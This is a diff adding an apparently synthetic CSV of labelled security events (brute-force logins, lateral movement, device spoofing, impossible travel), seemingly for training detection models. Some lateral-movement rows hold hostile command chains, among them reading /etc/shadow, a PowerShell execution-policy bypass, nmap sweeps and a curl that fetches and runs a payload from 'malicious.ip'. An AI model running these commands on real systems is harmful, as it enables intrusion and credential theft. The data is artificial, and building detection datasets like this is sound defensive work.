@@ -1,0 +1,726 @@
+entity_id,entity_type,timestamp,source_ip,geo_location,resource_accessed,auth_method,session_duration,command_sequence,device_fingerprint,login_success,label
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:41:59,99.73.28.219,"Garciashire, Chile",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:42:03,99.73.28.219,"North Kelly, Hong Kong",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:42:05,99.73.28.219,"Jeffreymouth, Oman",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:42:08,99.73.28.219,"Parkerhaven, Cocos (Keeling) Islands",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:42:09,99.73.28.219,"Port Billy, Hungary",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:42:09,99.73.28.219,"Mcgeeton, Tuvalu",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:42:12,99.73.28.219,"Jerrybury, Heard Island and McDonald Islands",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:42:19,99.73.28.219,"South April, Congo",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:42:23,99.73.28.219,"North Michael, Guinea-Bissau",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:42:24,99.73.28.219,"Kimberg, Saint Martin",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:42:26,99.73.28.219,"Tanyashire, Malaysia",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:42:27,99.73.28.219,"East John, Sweden",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:42:29,99.73.28.219,"South Taylormouth, Lebanon",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:42:30,99.73.28.219,"Nicholashaven, Bangladesh",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:42:33,99.73.28.219,"Millerbury, Guinea",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:42:35,99.73.28.219,"Thompsonshire, Rwanda",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:42:39,99.73.28.219,"Parrishchester, Ecuador",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:42:43,99.73.28.219,"Port Sarah, Togo",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:42:43,99.73.28.219,"Jamesland, Dominican Republic",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:42:47,99.73.28.219,"Jonathanville, Indonesia",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:42:55,99.73.28.219,"Port Donaldport, Tanzania",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:42:57,99.73.28.219,"Gonzalesville, Honduras",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:42:59,99.73.28.219,"Port Jacqueline, Kazakhstan",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:05,99.73.28.219,"Davidside, Marshall Islands",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:13,99.73.28.219,"Melissafort, Thailand",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:14,99.73.28.219,"Deannahaven, Northern Mariana Islands",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:15,99.73.28.219,"Rebeccamouth, Canada",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:17,99.73.28.219,"Longshire, Guernsey",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:19,99.73.28.219,"South David, Ecuador",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:19,99.73.28.219,"South Leah, Italy",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:21,99.73.28.219,"Mooreburgh, Anguilla",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:23,99.73.28.219,"Lake Heatherborough, Slovakia (Slovak Republic)",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:25,99.73.28.219,"Lake Adamville, Tajikistan",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:31,99.73.28.219,"Port Andrea, Denmark",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:35,99.73.28.219,"West Johnfort, Tajikistan",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:41,99.73.28.219,"Rittermouth, Timor-Leste",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:44,99.73.28.219,"South Michael, Cape Verde",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:44,99.73.28.219,"North Dennischester, Armenia",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:56,99.73.28.219,"South Ian, Greece",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:59,99.73.28.219,"West Kyleshire, Malaysia",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:44:14,99.73.28.219,"Allenport, British Virgin Islands",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:44:31,99.73.28.219,"Adamstad, Moldova",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:44:44,99.73.28.219,"Guerreroside, Cook Islands",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:44:59,99.73.28.219,"Port Jasonberg, Andorra",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:45:29,99.73.28.219,"Dianaside, Pakistan",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:39:41,62.11.193.217,"South Cindyville, Korea",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:39:43,62.11.193.217,"East Lisa, Lesotho",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:39:47,62.11.193.217,"Aliciamouth, Lithuania",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:39:48,62.11.193.217,"Bryanbury, Chad",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:39:49,62.11.193.217,"South Patrick, Faroe Islands",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:39:53,62.11.193.217,"New Ericchester, Papua New Guinea",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:39:53,62.11.193.217,"Montgomeryburgh, Netherlands Antilles",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:39:55,62.11.193.217,"North Tiffanyside, Liechtenstein",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:39:56,62.11.193.217,"West Nicolemouth, Tajikistan",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:39:59,62.11.193.217,"North Lisa, Saint Pierre and Miquelon",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:39:59,62.11.193.217,"Lake Aaronhaven, Angola",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:01,62.11.193.217,"Christinebury, Sao Tome and Principe",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:04,62.11.193.217,"Quinntown, Poland",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:05,62.11.193.217,"Raymondport, Nicaragua",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:07,62.11.193.217,"West William, Peru",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:13,62.11.193.217,"North Andrewstad, Niger",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:14,62.11.193.217,"South Nataliechester, Georgia",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:14,62.11.193.217,"Watersmouth, Czech Republic",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:17,62.11.193.217,"East Mike, Comoros",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:26,62.11.193.217,"Lake Codyview, Barbados",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:29,62.11.193.217,"Shaneside, Algeria",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:33,62.11.193.217,"South Angelport, Czech Republic",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:35,62.11.193.217,"Francisburgh, Reunion",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:39,62.11.193.217,"Lisatown, Angola",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:41,62.11.193.217,"Millertown, Suriname",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:41,62.11.193.217,"North Joshua, Philippines",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:43,62.11.193.217,"Coxton, Falkland Islands (Malvinas)",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:49,62.11.193.217,"Collinfort, Liberia",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:57,62.11.193.217,"South Michelle, Gibraltar",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:41:17,62.11.193.217,"Hursttown, Japan",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:41:26,62.11.193.217,"West Crystalside, Martinique",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:41:31,62.11.193.217,"Lake Troy, Bahrain",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:41:33,62.11.193.217,"Scottside, Netherlands",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:41:46,62.11.193.217,"West Alexanderville, Chile",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c3b75f5e-a13f-4538-801a-c5a5b75a493f,User,2026-06-25 07:42:54,178.113.119.255,"Normanhaven, Suriname",Confluence,Biometric,4515,powershell.exe -ExecutionPolicy Bypass -File recon.ps1,Windows 11 - Chrome,True,Lateral Movement
+c3b75f5e-a13f-4538-801a-c5a5b75a493f,User,2026-06-25 07:45:54,178.113.119.255,"Normanhaven, Suriname",HRIS,Biometric,3672,cat /etc/passwd -> cat /etc/shadow -> su root,Windows 11 - Chrome,True,Lateral Movement
+c3b75f5e-a13f-4538-801a-c5a5b75a493f,User,2026-06-25 08:02:54,178.113.119.255,"Normanhaven, Suriname",GitLab,Biometric,333,ping -> ssh admin@10.0.0.5 -> sudo su,Windows 11 - Chrome,True,Lateral Movement
+710708be-709d-4ce2-8f92-246a6ca0b3a2,User,2026-06-25 09:42:41,36.206.248.141,"New Jennifershire, Kenya",Jira,Password,296,N/A,Kali Linux - Curl - MAC: 40:b1:1d:80:8d:e4,True,Device Spoofing
+defd1145-3e40-4d27-b2b4-029efd2c6ebe,User,2026-06-25 09:46:36,13.194.195.95,"South Jessica, Botswana",Database,MFA,1805,N/A,Unknown Browser/Device,True,Impossible Travel
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:28:35,168.219.223.255,"Petersenhaven, Brunei Darussalam",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:28:36,168.219.223.255,"Lake Nicholasmouth, Paraguay",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:28:44,168.219.223.255,"Tarafurt, Korea",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:28:45,168.219.223.255,"West Lesliefort, Peru",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:28:45,168.219.223.255,"Stoneshire, United States Minor Outlying Islands",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:28:46,168.219.223.255,"Ethanhaven, Puerto Rico",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:28:47,168.219.223.255,"Juliastad, Uzbekistan",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:28:47,168.219.223.255,"Lake Benjaminborough, Monaco",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:28:51,168.219.223.255,"Martinland, Wallis and Futuna",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:28:51,168.219.223.255,"Taylormouth, Australia",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:28:53,168.219.223.255,"Terryport, Saint Barthelemy",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:28:56,168.219.223.255,"South Steven, Pakistan",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:29:02,168.219.223.255,"South Jacquelinemouth, Uganda",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:29:04,168.219.223.255,"Floresfort, Germany",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:29:05,168.219.223.255,"Lake Michelle, Solomon Islands",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:29:07,168.219.223.255,"Georgeborough, Benin",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:29:10,168.219.223.255,"Ortegastad, Mozambique",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:29:10,168.219.223.255,"South David, Guernsey",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:29:23,168.219.223.255,"South Laurenton, Sao Tome and Principe",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:29:25,168.219.223.255,"East Nathantown, Nepal",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:29:25,168.219.223.255,"Amyfurt, Algeria",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:29:27,168.219.223.255,"Lake Jennifer, Italy",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:29:45,168.219.223.255,"Richardside, Algeria",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:29:47,168.219.223.255,"East Beckybury, Sierra Leone",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:29:47,168.219.223.255,"East Russell, Bangladesh",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:29:55,168.219.223.255,"Port David, Congo",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:30:00,168.219.223.255,"Port Willie, Honduras",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:30:03,168.219.223.255,"West Jessica, Singapore",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:30:05,168.219.223.255,"Port James, Swaziland",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:30:10,168.219.223.255,"Robertside, French Southern Territories",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:30:11,168.219.223.255,"South Thomasside, Vanuatu",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:30:19,168.219.223.255,"Sanchezburgh, Libyan Arab Jamahiriya",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:30:27,168.219.223.255,"South Robertbury, Netherlands",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:30:30,168.219.223.255,"East Matthewborough, Belize",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:31:03,168.219.223.255,"Davidton, Benin",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:31:07,168.219.223.255,"North Amyside, Pitcairn Islands",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:31:10,168.219.223.255,"Port Patricia, Honduras",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:31:11,168.219.223.255,"Matthewshire, Namibia",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:31:20,168.219.223.255,"Fuenteschester, Moldova",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:31:25,168.219.223.255,"West Sydneytown, Georgia",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:31:55,168.219.223.255,"West Dylan, Falkland Islands (Malvinas)",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+391fe303-b2d1-4569-b573-b53f4a7e663f,User,2026-06-25 11:16:33,77.32.54.235,"East Emilyland, Guinea-Bissau",Backup Server,Hardware Token,1989,whoami -> net user /domain -> nmap -sT 10.0.0.0/24,macOS 13 - Firefox,True,Lateral Movement
+391fe303-b2d1-4569-b573-b53f4a7e663f,User,2026-06-25 11:19:33,77.32.54.235,"East Emilyland, Guinea-Bissau",Jira,Hardware Token,4721,cat /etc/passwd -> cat /etc/shadow -> su root,macOS 13 - Firefox,True,Lateral Movement
+cb32c077-b2c0-48dc-b321-a12bab4970de,User,2026-06-25 11:20:14,85.66.218.223,"East Caitlin, Djibouti",VPN,SSO,2370,N/A,Unknown Browser/Device,True,Impossible Travel
+31c164d4-14f0-4ae5-926e-ac18d9541c50,User,2026-06-25 11:25:49,136.190.221.65,"Geraldfort, British Indian Ocean Territory (Chagos Archipelago)",CRM,Biometric,1530,N/A,iOS 17 - Curl - MAC: 50:8b:29:95:88:6b,True,Device Spoofing
+391fe303-b2d1-4569-b573-b53f4a7e663f,User,2026-06-25 11:32:33,77.32.54.235,"East Emilyland, Guinea-Bissau",GitLab,Hardware Token,3635,whoami -> net user /domain -> nmap -sT 10.0.0.0/24,macOS 13 - Firefox,True,Lateral Movement
+dcd396c4-5c93-4991-bbd7-68d1ecbe67e8,User,2026-06-25 11:40:54,103.90.165.122,"Sonyatown, Djibouti",Database,Hardware Token,1341,ping -> ssh admin@10.0.0.5 -> sudo su,macOS 13 - Firefox,True,Lateral Movement
+391fe303-b2d1-4569-b573-b53f4a7e663f,User,2026-06-25 11:43:33,77.32.54.235,"East Emilyland, Guinea-Bissau",Confluence,Hardware Token,2850,cat /etc/passwd -> cat /etc/shadow -> su root,macOS 13 - Firefox,True,Lateral Movement
+dcd396c4-5c93-4991-bbd7-68d1ecbe67e8,User,2026-06-25 11:46:54,103.90.165.122,"Sonyatown, Djibouti",Domain Controller,Hardware Token,5429,cat /etc/passwd -> cat /etc/shadow -> su root,macOS 13 - Firefox,True,Lateral Movement
+dcd396c4-5c93-4991-bbd7-68d1ecbe67e8,User,2026-06-25 11:49:54,103.90.165.122,"Sonyatown, Djibouti",Domain Controller,Hardware Token,2919,curl http://malicious.ip/payload.sh -> chmod +x payload.sh -> ./payload.sh,macOS 13 - Firefox,True,Lateral Movement
+dcd396c4-5c93-4991-bbd7-68d1ecbe67e8,User,2026-06-25 12:01:54,103.90.165.122,"Sonyatown, Djibouti",HRIS,Hardware Token,3150,ping -> ssh admin@10.0.0.5 -> sudo su,macOS 13 - Firefox,True,Lateral Movement
+5279f598-b747-407d-9071-29465d9c5d1b,User,2026-06-25 12:35:28,197.147.19.215,"East Dustinburgh, Samoa",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+5279f598-b747-407d-9071-29465d9c5d1b,User,2026-06-25 12:35:30,197.147.19.215,"Stevenshire, Germany",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+5279f598-b747-407d-9071-29465d9c5d1b,User,2026-06-25 12:35:34,197.147.19.215,"North Karenview, Zimbabwe",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+5279f598-b747-407d-9071-29465d9c5d1b,User,2026-06-25 12:35:36,197.147.19.215,"Kinghaven, Cyprus",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+5279f598-b747-407d-9071-29465d9c5d1b,User,2026-06-25 12:35:40,197.147.19.215,"Johnchester, Guernsey",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+5279f598-b747-407d-9071-29465d9c5d1b,User,2026-06-25 12:35:40,197.147.19.215,"Johnsonville, Venezuela",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+5279f598-b747-407d-9071-29465d9c5d1b,User,2026-06-25 12:35:41,197.147.19.215,"Jessicaside, Nauru",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+5279f598-b747-407d-9071-29465d9c5d1b,User,2026-06-25 12:35:42,197.147.19.215,"North Charlesberg, Romania",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+5279f598-b747-407d-9071-29465d9c5d1b,User,2026-06-25 12:35:48,197.147.19.215,"Shannonmouth, Gambia",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+5279f598-b747-407d-9071-29465d9c5d1b,User,2026-06-25 12:35:48,197.147.19.215,"Roberthaven, Kenya",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+5279f598-b747-407d-9071-29465d9c5d1b,User,2026-06-25 12:35:52,197.147.19.215,"Lisastad, Sri Lanka",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+5279f598-b747-407d-9071-29465d9c5d1b,User,2026-06-25 12:36:00,197.147.19.215,"Brandonburgh, Congo",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+5279f598-b747-407d-9071-29465d9c5d1b,User,2026-06-25 12:36:04,197.147.19.215,"Leonardton, Grenada",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
